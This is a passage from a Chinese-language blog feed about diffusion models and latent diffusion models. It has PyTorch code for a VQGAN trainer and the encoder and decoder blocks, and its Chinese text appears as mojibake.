preproc(img)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dataloader</span>(<span class="params">file_path, batch_size</span>):</span><br><span class="line">    dirpath = file_path</span><br><span class="line">    dataset = wds.WebDataset(dirpath).shuffle(<span class="number">1000</span>).decode(<span class="string">&quot;pil&quot;</span>).to_tuple(<span class="string">&quot;txt&quot;</span>, <span class="string">&quot;jpg&quot;</span>).<span class="built_in">map</span>(preprocessing)</span><br><span class="line">    dataloader = DataLoader(dataset, batch_size=batch_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dataloader</span><br></pre></td></tr></table></figure><h3 id="trainer">trainer</h3><p>å› ä¸ºæˆ‘æŠŠlossè¿˜æ˜¯é€‰æ‹©äº†ä¸¢åœ¨ä¸€ä¸ªç±»é‡Œ,æ‰€ä»¥æˆ‘æœ€ç»ˆå®ç°å¯èƒ½çœ‹èµ·æ¥æ¯”outlierç®€å•ä¸€ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> utils <span class="keyword">as</span> vutils</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.path.append(<span class="string">&quot;/home/lxia&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ldm.data.mscoco_dataloader <span class="keyword">import</span> get_dataloader</span><br><span class="line"><span class="keyword">from</span> ldm.loss.vqperceptual <span class="keyword">import</span> VQLPIPSWithDiscriminator</span><br><span class="line"><span class="keyword">from</span> ldm.model.ldm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/dome272/VQGAN-pytorch/blob/main/training_vqgan.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrainVQ</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, vq, dataloader, num_epochs, lr=<span class="number">1e-6</span>, betas=(<span class="params"><span class="number">0.5</span>, <span class="number">0.9</span></span>), device=<span class="string">&#x27;cuda&#x27;</span></span>):</span><br><span class="line">        <span class="keyword">if</span> device == <span class="string">&#x27;cuda&#x27;</span>:</span><br><span class="line">            self.device = torch.device(<span class="string">&quot;cuda&quot;</span>) <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> torch.device(<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line">        self.vq = vq.to(self.device)</span><br><span class="line">        self.dataloader = dataloader</span><br><span class="line">        self.lr = lr</span><br><span class="line">        self.betas = betas</span><br><span class="line">        self.vq_perceptual_disc = VQLPIPSWithDiscriminator().to(self.device)</span><br><span class="line">        self.num_epochs = num_epochs</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_optimizer_autoencoder</span>(<span class="params">self</span>):</span><br><span class="line">        autoencoder = self.vq</span><br><span class="line">        lr = self.lr</span><br><span class="line">        betas = self.betas</span><br><span class="line">        optimizer = torch.optim.Adam(<span class="built_in">list</span>(autoencoder.encoder.parameters()) +</span><br><span class="line">                                     <span class="built_in">list</span>(autoencoder.decoder.parameters()) +</span><br><span class="line">                                     <span class="built_in">list</span>(autoencoder.vq.parameters()) +</span><br><span class="line">                                     <span class="built_in">list</span>(autoencoder.quant_conv.parameters()) +</span><br><span class="line">                                     <span class="built_in">list</span>(autoencoder.post_quant_conv.parameters()),</span><br><span class="line">                                     lr=lr, betas=betas</span><br><span class="line">                                     )</span><br><span class="line">        <span class="keyword">return</span> optimizer</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_optimizer_discriminator</span>(<span class="params">self</span>):</span><br><span class="line">        discriminator = self.vq_perceptual_disc.discriminator</span><br><span class="line">        lr = self.lr</span><br><span class="line">        betas = self.betas</span><br><span class="line">        optimizer = torch.optim.Adam(<span class="built_in">list</span>(discriminator.parameters()),</span><br><span class="line">                                     lr=lr, betas=betas</span><br><span class="line">                                     )</span><br><span class="line">        <span class="keyword">return</span> optimizer</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">train</span>(<span class="params">self</span>):</span><br><span class="line">        opt_autoencoder = self.get_optimizer_autoencoder()</span><br><span class="line">        opt_discriminator = self.get_optimizer_discriminator()</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(self.num_epochs):</span><br><span class="line">            <span class="keyword">with</span> tqdm(self.dataloader) <span class="keyword">as</span> pbar:</span><br><span class="line">                <span class="keyword">for</span> i, (_, (txt, img)) <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">zip</span>(pbar, self.dataloader)):</span><br><span class="line">                    counter += <span class="built_in">len</span>(img)</span><br><span class="line">                    img = img.to(self.device)</span><br><span class="line">                    decoded_img, codebook_loss = self.vq(img)</span><br><span class="line">                    vq_loss, d_loss = self.vq_perceptual_disc(codebook_loss=codebook_loss,</span><br><span class="line">                                                              inputs=img,</span><br><span class="line">                                                              reconstructions=decoded_img,</span><br><span class="line">                                                              global_step=counter,</span><br><span class="line">                                                              last_layer=self.vq.get_last_layer()</span><br><span class="line">                                                              )</span><br><span class="line">                    opt_autoencoder.zero_grad()</span><br><span class="line">                    opt_discriminator.zero_grad()</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># not to free the grads after `backward` is called</span></span><br><span class="line">                    vq_loss.backward(retain_graph=<span class="literal">True</span>)</span><br><span class="line">                    d_loss.backward()</span><br><span class="line"></span><br><span class="line">                    opt_autoencoder.step()</span><br><span class="line">                    opt_discriminator.step()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> i % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                            real_fake_images = torch.cat((img[:<span class="number">4</span>], decoded_img.add(<span class="number">1</span>).mul(<span class="number">0.5</span>)[:<span class="number">4</span>]))</span><br><span class="line">                            vutils.save_image(real_fake_images, os.path.join(<span class="string">&quot;results&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;epoch&#125;</span>_<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>), nrow=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">                    pbar.set_postfix(</span><br><span class="line">                        vq_Loss=np.<span class="built_in">round</span>(vq_loss.cpu().detach().numpy().item(), <span class="number">5</span>),</span><br><span class="line">                        d_Loss=np.<span class="built_in">round</span>(d_loss.cpu().detach().numpy().item(), <span class="number">3</span>)</span><br><span class="line">                    )</span><br><span class="line">                    pbar.update(<span class="number">0</span>)</span><br><span class="line">                torch.save(self.vq.state_dict(), os.path.join(<span class="string">&quot;checkpoints&quot;</span>, <span class="string">f&quot;vq_epoch_<span class="subst">&#123;epoch&#125;</span>.pt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    BATCH_SIZE = <span class="number">4</span></span><br><span class="line">    device = <span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span></span><br><span class="line"></span><br><span class="line">    data_path = <span class="string">&#x27;/home/lxia/ldm/data/dataset/&#123;00000..00059&#125;.tar&#x27;</span></span><br><span class="line">    dataloader = get_dataloader(data_path, batch_size=BATCH_SIZE)</span><br><span class="line"></span><br><span class="line">    num_residual = <span class="number">2</span></span><br><span class="line">    vq = VQModel(n_e=<span class="number">4096</span>, e_dim=<span class="number">256</span>, beta=<span class="number">0.25</span>, input_channel=<span class="number">256</span>, num_res=num_residual)</span><br><span class="line">    num_epochs = <span class="number">20</span></span><br><span class="line">    trainer = TrainVQ(vq=vq, dataloader=dataloader, num_epochs=num_epochs)</span><br><span class="line"></span><br><span class="line">    trainer.train()</span><br></pre></td></tr></table></figure><p>batchè®¾ç½®è¿‡é«˜ä¼šç›´æ¥oom,é‡åŠ›è€Œè¡Œ. ä¸ªäººæ„Ÿè§‰æ•°æ®é›†ä¹ŸæŒºå¤§çš„,æ‰€ä»¥å…¶å®ä¹Ÿè®­ç»ƒäº†è¶…çº§ä¹…,å¯ä»¥å°è¯•æŠŠtaræ–‡ä»¶ä»…è½½å…¥0-9è€Œä¸æ˜¯0-59,ç„¶åepochåšåšè®¾ç½®,è®­ç»ƒåº”è¯¥ä¼šå¿«ä¸å°‘.</p><p>æˆ‘ç›®å‰è‡ªå·±è·‘çš„å¤§æ¦‚è¿›è¡Œäº†åŠä¸ªepochæ•ˆæœå¦‚å›¾,ç›®æµ‹å¤šå‡ ä¸ªepochæ•ˆæœä¼šæ˜¾è‘—ä¸å°‘. <img src="result.png" /></p>]]></content>
      
      
      <categories>
          
          <category> ML Diffusion model </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>diffusion model(2)-LDM</title>
      <link href="/2024/04/11/diffusion-model-2-LDM/"/>
      <url>/2024/04/11/diffusion-model-2-LDM/</url>
      
        <content type="html"><![CDATA[<p>ä¸€å¼€å§‹æ˜¯çœ‹çš„Stable diffusionçš„,ä»¥ä¸ºæ˜¯è¿™é‡Œå¼€å§‹è®²conditioning mechanismsçš„,åæ¥å‘ç°ä»–ä»¬ideaæ˜¯ä»LDMè¿‡æ¥çš„,é‚£ä¹ˆè¿™æ¬¡å°±å­¦ä¹ ä¸€ä¸‹LDM,è¿™æ¬¡æ²¡æ¥å¾—åŠçœ‹æ¨¡å‹,è¿™ä¸¤å¤©ç¨å¾®æœ‰ç‚¹å¿™,çœ‹å‘¨æœ«ä¼šä¸ä¼šæœ‰ç©ºè¡¥ä¸€ä¸‹äº†.</p><h2 id="latent-diffusion-models">Latent Diffusion Models</h2><p>LDMåŒºåˆ«äºæˆ‘ä»¬ä¹‹å‰çœ‹çš„ä¸€èˆ¬diffusion modelä¸»è¦åœ¨äºä¸¤ç‚¹</p><ol type="1"><li><p>ä¹‹å‰æˆ‘ä»¬å¯¹ä¸€èˆ¬æ‰©æ•£æ¨¡å‹æ˜¯ç›´æ¥å–‚å›¾ç‰‡æ•°æ®. è€ŒLDMå¯¹å…¶è¿›è¡Œäº†ä¼˜åŒ–, å®ƒè®¾è®¡äº†ä¸€ä¸ªencoderå’Œä¸€ä¸ªdecoder, encoderå¯¹è¾“å…¥å›¾ç‰‡è¿›è¡Œå‹ç¼©å°†å…¶è½¬åŒ–åˆ°latent space, ç„¶åè¿›è¡Œä¸€èˆ¬diffusionæ“ä½œä¹‹åæˆ‘ä»¬åŒæ ·ä¼šç”Ÿæˆä¸€ä¸ªlatent vector, æœ€åæˆ‘ä»¬å¯¹è¿™ä¸ªç”Ÿæˆçš„latent vectorè¿›è¡Œdecodeè®©å…¶æ¢å¤åˆ°åƒç´ ç©ºé—´å³å¯å®Œæˆå›¾ç‰‡ç”Ÿæˆ. æœ¬è´¨é«˜ç»´å˜ä½ç»´è¿›è¡Œå¤„ç†. è®ºæ–‡å°†æ­¤æ–¹æ³•ç§°ä¸ºPerceptual Compression.</p></li><li><p>ç¬¬äºŒä¸ªåŒºåˆ«å°±æ˜¯æ¡ä»¶ç”Ÿæˆäº†, å…¶é€šè¿‡åœ¨unetä¸»å¹²ç½‘ç»œæ·»åŠ cross-attentionæ¥è¿›è¡Œé’ˆå¯¹promptçš„å›¾ç‰‡ç”Ÿæˆ.</p></li></ol><h3 id="perceptual-image-compression">Perceptual Image Compression</h3><p>æœ¬è´¨å®ç°ä¸€ä¸ªç¼–ç è§£ç å™¨,ç„¶åè¿™ä¸ªç¼–ç è§£ç å™¨å…ˆå»å­¦ä¹ å°†å›¾ç‰‡æ˜ å°„åˆ°latent space,ç¬¬äºŒéƒ¨å†å»è®­ç»ƒdiffusion modelä½œä¸ºå†…å±‚.</p><blockquote><p>æ„ŸçŸ¥å‹ç¼©æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªtradeoffï¼Œä¹‹å‰çš„å¾ˆå¤šæ‰©æ•£æ¨¡å‹æ²¡æœ‰ä½¿ç”¨è¿™ä¸ªæŠ€å·§ä¹Ÿå¯ä»¥è¿›è¡Œï¼Œä½†åŸæœ‰çš„éæ„ŸçŸ¥å‹ç¼©çš„æ‰©æ•£æ¨¡å‹æœ‰ä¸€ä¸ªå¾ˆå¤§çš„é—®é¢˜åœ¨äºï¼Œç”±äºåœ¨åƒç´ ç©ºé—´ä¸Šè®­ç»ƒæ¨¡å‹ï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›ç”Ÿæˆä¸€å¼ åˆ†è¾¨ç‡å¾ˆé«˜çš„å›¾ç‰‡ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬è®­ç»ƒçš„ç©ºé—´ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆé«˜ç»´çš„ç©ºé—´ã€‚å¼•å…¥æ„ŸçŸ¥å‹ç¼©å°±æ˜¯è¯´é€šè¿‡VAEè¿™ç±»è‡ªç¼–ç æ¨¡å‹å¯¹åŸå›¾ç‰‡è¿›è¡Œå¤„ç†ï¼Œå¿½ç•¥æ‰å›¾ç‰‡ä¸­çš„é«˜é¢‘ä¿¡æ¯ï¼Œåªä¿ç•™é‡è¦ã€åŸºç¡€çš„ä¸€äº›ç‰¹å¾ã€‚è¿™ç§æ–¹æ³•å¸¦æ¥çš„çš„å¥½å¤„å°±åƒå¼•æ–‡éƒ¨åˆ†è¯´çš„ä¸€æ ·ï¼Œèƒ½å¤Ÿ<strong>å¤§å¹…é™ä½è®­ç»ƒå’Œé‡‡æ ·é˜¶æ®µçš„è®¡ç®—å¤æ‚åº¦</strong>ï¼Œè®©æ–‡å›¾ç”Ÿæˆç­‰ä»»åŠ¡èƒ½å¤Ÿåœ¨æ¶ˆè´¹çº§GPUä¸Šï¼Œåœ¨10ç§’çº§åˆ«æ—¶é—´ç”Ÿæˆå›¾ç‰‡ï¼Œå¤§å¤§é™ä½äº†è½åœ°é—¨æ§›ã€‚</p></blockquote><h3 id="é‡‡æ ·å› å­-f">é‡‡æ ·å› å­ $ f $</h3><p>f = H / h, å…¶ä¸­å¦‚æœf = 1å°±ç›¸å½“äºæ²¡æœ‰å¯¹ç©ºé—´è¿›è¡Œå‹ç¼©, å¦‚æœfè¶Šå¤§, å°±è¯´æ˜å‹ç¼©ç¨‹åº¦è¶Šé«˜,éœ€è¦å ç”¨çš„èµ„æºæ›´å°‘ä½†åŒæ ·ä¹Ÿæ›´å®¹æ˜“å¤±çœŸ. è®ºæ–‡å¯¹æ¯”äº†fåœ¨{1,2,4,8,16,32},å‘ç°åœ¨4-16æ•ˆæœè¾ƒå¥½ä¸”æ¨èLDM-4å’ŒLDM-8</p><h3 id="cross-attention">cross attention</h3><p>è¿™ä¸ªå°±æ˜¯ä¸ºä»€ä¹ˆLDMå¯ä»¥åšåˆ°text_to_img,é’ˆå¯¹textè€Œè¨€å¯ä»¥å…ˆåšä¸€äº›tokenizationå’Œembedding,ä¹‹åå’Œä¼ å…¥çš„img_featureä¸€èµ·åšcross attention.</p><p>è€Œä½œè€…åˆ™æ˜¯å†™åˆ°äº†ä¸ºäº†é¢„å¤„ç†y,ä»–ä»¬å¼•å…¥äº†ä¸€ç§æ–°çš„domain specific encoder $ $ ä»è€ŒæŠŠä»»æ„æºyç¼–ç åˆ°ä¸­é—´æ€ $ (y) $</p><p><img src="ldm_cross_attention.png" /></p><p>ç„¶åå°±æ˜¯Qä¸ºimg_feature,KVä¸ºtext_embeddingçš„attentionæœºåˆ¶.</p><p><img src="cross_attention.png" /></p><h2 id="implementation4.13">implementation(4.13)</h2><p>é¦–å…ˆä»£ç æ˜¯å‚è€ƒçš„CompVisçš„<a href="https://github.com/CompVis/latent-diffusion">repo</a>,é¦–å…ˆç®€è¦åˆ†æä¸€ä¸‹å„ä¸ªéƒ¨åˆ†çš„å®ç°,ç„¶åçœ‹ä¸‹è¿™å‘¨æœ«æœ‰æ²¡æœ‰å¯èƒ½åŸºäºä¹‹å‰çš„ç®€æ˜“diffusion modelæ¥å®ç°ä¸€ä¸ªç®€æ˜“çš„ldm.</p><p>æ—¢ç„¶ä¹‹å‰å·²ç»åˆ†æè¿‡äº†ä¸€èˆ¬diffusion modelçš„å·¥ä½œåŸç†,é‚£ä¹ˆè¿™é‡Œå°±å…ˆçœ‹çœ‹å‡ ä¸ªæ–°å¢çš„éƒ¨åˆ†å¦‚ä½•å®ç°, å…·ä½“å°±æ˜¯encoder,decoder, text_processing, attention mechanism.</p><h3 id="perceptual-image-compressionç›¸å…³">Perceptual Image Compressionç›¸å…³</h3><p>ä¸»ä½“åœ¨ldm.models.autoencoder.VQModelInterface,å…¶ä¸­å…³é”®éƒ¨åˆ†ä¸ºå¤„ç†encodeçš„decodeçš„éƒ¨åˆ†. å¦å¤–ä¸­é—´è¿˜æœ‰ä¸€ä¸ªVQè¿‡ç¨‹.</p><h4 id="vqvector-quantization">VQ(Vector Quantization)</h4><p><del>ä¼¼ä¹æ˜¯ä¸€ä¸ªå¾ˆæ—©çš„ä¸œè¥¿,ä¸è¿‡æˆ‘ä¸ªäººç¬¬ä¸€æ¬¡è§åˆ°,è®°å½•ä¸€ä¸‹. å‚è€ƒæ–‡ç« <a href="https://blog.csdn.net/FRkid/article/details/40654841">VQ</a></del> <del>è¯´ç™½äº†å°±æ˜¯VQä¼šå°†æŸä¸ªåŒºé—´å†…çš„ä¸œè¥¿ç”¨æŸä¸ªå€¼æ›¿æ¢,æ¯”å¦‚0-1å…¨éƒ¨æ˜ å°„åˆ°0,1-2å…¨éƒ¨æ˜ å°„åˆ°1.</del> <del>ä¸è¿‡ç¼ºé™·å°±æ˜¯å®Œå…¨ç©ºé—´åˆ’åˆ†å¯èƒ½å¯¼è‡´ä¸å‡åŒ€,æ¯”å¦‚æˆ‘ä»¬éœ€è¦å°†0-255æ˜ å°„åˆ°4bit,ç„¶åæ‰€æœ‰å€¼éƒ½åœ¨0-15,é‚£ä¹ˆæœ€åå¾—åˆ°çš„å›¾åƒå°±ä¼šå…¨éƒ¨ä¸º0.</del> <del>ä¼˜åŒ–æ–¹å¼ä¸ºèšç±»ç®—æ³•,æ¯”å¦‚KMean,æ‰‹åŠ¨é€‰æ‹©æ‰€æœ‰ç‚¹ä¸­çš„centroids,ç„¶åå†é’ˆå¯¹centroidsè¿›è¡Œæ˜ å°„.</del></p><p>4.16: æœ‰ç‚¹ç†è§£é”™äº†. è¿™é‡Œçš„VQæ¥è‡ªäºCompVisçš„å¦ä¸€ç¯‡è®ºæ–‡,<a href="https://arxiv.org/abs/2012.09841">Taming Transformers for High-Resolution Image Synthesis</a>,æœ¬è´¨å…¶å®æ˜¯VQGAN,æ‰€ä»¥å¤§æ¦‚çš„å†å²å‘å±•å¤§æ¦‚æ˜¯VQVAE-&gt;VQGAN-&gt;LDM,å…¶ä¸­LDMä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯VQ+DDPM. è¿™ä¸ªVQå°±æ˜¯å‹ç¼©å›¾ç‰‡åˆ°éšè—ç©ºé—´çš„æ ¸å¿ƒæ‰€åœ¨, ä¹Ÿæ˜¯æ‰€è°“çš„First stage model.</p><p>æœ€æœ¬è´¨çš„VQå…¶å®è¿˜æ˜¯ä¸Šé¢åˆ’æ‰çš„éƒ¨åˆ†,åŒ–è¿ç»­ä¸ºç¦»æ•£,è´´ä¸€ç¯‡è®²è§£<a href="https://www.spaces.ac.cn/archives/6760#VQ-VAE">VQVAE</a></p><p>ä»è¿™ç¯‡æ–‡ç« çœ‹åˆ°VQVAEä¸€å¼€å§‹ç”¨VQè§£å†³çš„é—®é¢˜æ˜¯ 1. PixelCNNè¿™ç§éœ€è¦ç¦»æ•£æ•°æ®çš„æ¨¡å‹åº”è¯¥å¦‚ä½•è¿›è¡Œé™ç»´,å»ºæ¨¡,æ¢å¤. 2. å¯¹å¾…ç¦»æ•£æ•°æ®ä¸­æ— æ¢¯åº¦éƒ¨åˆ†åº”è¯¥å¦‚ä½•å¤„ç†(Straight-Through Estimator).</p><p>è€ŒVQGAN, LDMç»§ç»­å»¶ç”¨äº†VQè¿™ä¸€æ€æƒ³, è¿™äº›æ¨¡å‹æŠŠVQä¸¢åˆ°äº†ç¬¬ä¸€é˜¶æ®µ, ç›®çš„æ˜¯è®­ç»ƒä¸€ä¸ªæ‰€è°“çš„autoencoder.</p><h4 id="resnet">resnet</h4><p>é¦–å…ˆencoderå’Œdecoderé‡Œé¢æ¯ä¸€ä¸ªç»´åº¦å˜åŒ–éƒ½æ˜¯resnetä½œä¸ºåŸºç¡€å—æ¥å¤„ç†çš„,å¯¹äºä»–ä»¬å†™çš„resnetä¸éœ€è¦å¤ªè¿‡å…³æ³¨å†…éƒ¨å¤„ç†,åªç”¨çœ‹æœ€åè¿”å›æ˜¯h+xå³å¯. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/CompVis/latent-diffusion/blob/main/ldm/modules/diffusionmodules/model.py#L121</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, temb</span>):</span><br><span class="line">        h = x</span><br><span class="line">        h = self.norm1(h)</span><br><span class="line">        h = nonlinearity(h)</span><br><span class="line">        h = self.conv1(h)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> temb <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            h = h + self.temb_proj(nonlinearity(temb))[:,:,<span class="literal">None</span>,<span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line">        h = self.norm2(h)</span><br><span class="line">        h = nonlinearity(h)</span><br><span class="line">        h = self.dropout(h)</span><br><span class="line">        h = self.conv2(h)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.in_channels != self.out_channels:</span><br><span class="line">            <span class="keyword">if</span> self.use_conv_shortcut:</span><br><span class="line">                x = self.conv_shortcut(x)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = self.nin_shortcut(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x+h</span><br></pre></td></tr></table></figure></p><h4 id="encoder">encoder</h4><p><a href="https://github.com/CompVis/latent-diffusion/blob/main/ldm/modules/diffusionmodules/model.py#L368">ä»£ç éƒ¨åˆ†</a></p><p>é¦–å…ˆæ„é€ å‡½æ•°éƒ¨åˆ†å°±å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ ¸ä¸º3çš„å·ç§¯å±‚conv_in, ç„¶åä¾æ®è®¾ç½®çš„æ®‹å·®å—çš„ä¸ªæ•°åˆå§‹åŒ–æ®‹å·®å—,ç„¶åmiddleè®¾ç½®ä¿©æ®‹å·®å—,ä¸­é—´å¤¹ç€ä¸€ä¸ªattentionå—,ç„¶åforwardçš„æ—¶å€™å°±ä¼ å‚å³å¯.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># timestep embedding</span></span><br><span class="line">        temb = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># downsampling</span></span><br><span class="line">        hs = [self.conv_in(x)]</span><br><span class="line">        <span class="keyword">for</span> i_level <span class="keyword">in</span> <span class="built_in">range</span>(self.num_resolutions):</span><br><span class="line">            <span class="keyword">for</span> i_block <span class="keyword">in</span> <span class="built_in">range</span>(self.num_res_blocks):</span><br><span class="line">                h = self.down[i_level].block[i_block](hs[-<span class="number">1</span>], temb)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(self.down[i_level].attn) &gt; <span class="number">0</span>:</span><br><span class="line">                    h = self.down[i_level].attn[i_block](h)</span><br><span class="line">                hs.append(h)</span><br><span class="line">            <span class="keyword">if</span> i_level != self.num_resolutions-<span class="number">1</span>:</span><br><span class="line">                hs.append(self.down[i_level].downsample(hs[-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># middle</span></span><br><span class="line">        h = hs[-<span class="number">1</span>]</span><br><span class="line">        h = self.mid.block_1(h, temb)</span><br><span class="line">        h = self.mid.attn_1(h)</span><br><span class="line">        h = self.mid.block_2(h, temb)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end</span></span><br><span class="line">        h = self.norm_out(h)</span><br><span class="line">        h = nonlinearity(h)</span><br><span class="line">        h = self.conv_out(h)</span><br><span class="line">        <span class="keyword">return</span> h</span><br></pre></td></tr></table></figure><h4 id="decoder">decoder</h4><p>å¤§è‡´å’Œencoderç›¸ä¼¼,ä¸è¿‡åŒºåˆ«encoderæ˜¯ä»é«˜ç»´åˆ°ä½ç»´,è¿™é‡Œdecoderä¸­çš„i_levelæ˜¯ä»reverseé‡Œé¢å–,å³ä½ç»´åº¦åˆ°é«˜ç»´åº¦ ç„¶åé™¤äº†éçº¿æ€§å±‚çš„å¤„ç†,å…¶ä»–éƒ½æ˜¯encoderçš„é€†åºå¤„ç†.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, z</span>):</span><br><span class="line">        <span class="comment">#assert z.shape[1:] == self.z_shape[1:]</span></span><br><span class="line">        self.last_z_shape = z.shape</span><br><span class="line"></span><br><span class="line">        <span class="comment"># timestep 